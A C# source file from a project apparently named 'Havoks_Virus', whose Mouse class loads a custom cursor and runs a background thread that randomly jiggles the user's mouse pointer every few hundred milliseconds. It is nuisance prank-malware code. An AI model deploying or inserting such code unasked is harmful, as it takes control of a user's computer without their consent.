using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Havoks_Virus
{
    public class Mouse
    {
        [DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]
        private static extern bool SystemParametersInfo(uint uiAction, uint uiParam, IntPtr pvParam, uint fWinIni);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr CreateIconFromResource(byte[] pbIconBits, uint cbIconBits, bool fIcon, uint dwVersion);

        private Cursor animatedCursor;
        private Thread movementThread;
        private volatile bool keepMoving = true; // Use volatile for thread safety

        public Mouse(string cursorFilePath)
        {
            try
            {
                animatedCursor = LoadAnimatedCursor(cursorFilePath);
                ApplyCursor();
            }
            catch (Exception ex)
            {
                // Handle the exception (e.g., log it) and provide a fallback cursor
                System.Console.WriteLine($"Error loading cursor: {ex.Message}");
                animatedCursor = Cursors.Default; // Fallback cursor
            }

            // Start the mouse movement thread
            StartMouseMovement();
        }

        private Cursor LoadAnimatedCursor(string cursorFilePath)
        {
            byte[] cursorBytes = File.ReadAllBytes(cursorFilePath);
            IntPtr hCursor = CreateIconFromResource(cursorBytes, (uint)cursorBytes.Length, false, 0x00030000);
            if (hCursor == IntPtr.Zero)
                throw new ApplicationException("Could not create cursor from resource.");

            return new Cursor(hCursor);
        }

        public void ApplyCursor()
        {
            Cursor.Current = animatedCursor;
        }

        public void StartMouseMovement()
        {
            if (movementThread == null || !movementThread.IsAlive)
            {
                movementThread = new Thread(new ThreadStart(RandomlyMoveMouse))
                {
                    IsBackground = true
                };
                movementThread.Start();
            }
        }

        private void RandomlyMoveMouse()
        {
            Random rnd = new Random();

            while (keepMoving)
            {
                // Generate a random X and Y offset for wiggling
                int offsetX = rnd.Next(-5, 6); // Random X-offset between -5 and 5
                int offsetY = rnd.Next(-5, 6); // Random Y-offset between -5 and 5

                Cursor.Position = new System.Drawing.Point(
                    Cursor.Position.X + offsetX,
                    Cursor.Position.Y + offsetY
                );

                // Sleep for a random duration between 300 and 500 milliseconds
                Thread.Sleep(rnd.Next(300, 501)); // Random sleep duration between 0.3 and 0.5 seconds
            }
        }

        public void StopMouseMovement()
        {
            keepMoving = false;
            if (movementThread != null && movementThread.IsAlive)
            {
                movementThread.Join();
            }
            ResetCursorToDefault();
        }

        private void ResetCursorToDefault()
        {
            Cursor.Current = Cursors.Default;
        }

        ~Mouse()
        {
            StopMouseMovement();
            if (animatedCursor != null)
            {
                animatedCursor.Dispose();
            }
        }
    }
}
